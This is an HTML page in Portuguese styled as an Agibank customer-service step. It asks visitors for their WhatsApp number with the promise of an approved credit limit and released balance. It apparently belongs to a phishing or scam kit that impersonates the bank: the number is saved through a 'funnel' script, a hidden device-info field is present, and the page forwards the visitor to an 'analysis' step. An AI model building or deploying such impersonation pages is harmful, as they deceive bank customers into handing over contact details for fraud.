<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Agibank - Atendimento Exclusivo</title>
    <script src="assets/js/tailwind.js"></script>
    <link href="assets/css/inter.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="assets/js/imask.js"></script>
    <script src="assets/js/funnel.js"></script>
    <style>
        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
        .whats-card { backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.95); }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="whats-card w-full max-w-md p-8 rounded-3xl shadow-2xl">
        <div class="text-center mb-6">
            <img src="assets/img/logo-agi.png" alt="Agibank" class="h-9 mx-auto mb-4 object-contain">
            <h1 class="text-2xl font-bold text-gray-900">Insira seu WhatsApp</h1>
            <p class="text-gray-500 mt-1 text-sm">Para receber o resultado da sua análise com o Agibank e liberar seu saldo.</p>
        </div>
        
        <form id="whatsapp-form" class="space-y-6">
            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase mb-2 ml-1 tracking-wider">Número do WhatsApp com DDD</label>
                <input type="text" id="whatsapp" name="whatsapp" required inputmode="numeric" placeholder="(00) 00000-0000" class="w-full px-5 py-4 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-[#0064F5] focus:bg-white outline-none transition-all text-lg font-bold text-gray-800">
            </div>
            
            <input type="hidden" id="device_info" name="device_info">
            
            <button type="submit" id="btn-submit" class="w-full bg-[#0064F5] hover:bg-[#0052cc] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform hover:-translate-y-1">
                VER MEU LIMITE LIBERADO
            </button>
            <button type="button" onclick="window.history.back()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-2xl transition-all text-sm">
                VOLTAR
            </button>
        </form>
    </div>

    <script>
        const whatsappInput = document.getElementById('whatsapp');
        const mask = IMask(whatsappInput, { mask: '(00) 00000-0000' });

        const savedData = getFunnelData();
        if (savedData.whatsapp) {
            whatsappInput.value = savedData.whatsapp;
            mask.updateValue();
        }

        ['input', 'change', 'paste', 'blur'].forEach(ev => {
            whatsappInput.addEventListener(ev, () => {
                mask.updateValue();
            });
        });

        function validarWhats(whats) {
            const clean = whats.replace(/[^\d]+/g, '');
            return clean.length >= 10 && clean.length <= 11;
        }

        document.getElementById('whatsapp-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            mask.updateValue();
            
            const rawValue = whatsappInput.value;
            const cleanWhats = rawValue.replace(/\D/g, '');
            
            if (!validarWhats(cleanWhats)) {
                alert('Por favor, informe um número de WhatsApp válido com DDD.');
                return;
            }

            const btn = document.getElementById('btn-submit');
            btn.innerText = 'Processando...';
            btn.disabled = true;

            const finalPayload = {
                whatsapp: rawValue,
                whatsapp_clean: cleanWhats
            };

            sessionStorage.setItem('user_whatsapp', rawValue);
            await saveFunnelData('whatsapp', finalPayload);

            // Próxima etapa do funil: ANÁLISE / RESULTADO
            navTo('analise.html');
        });
    </script>
</body>
</html>
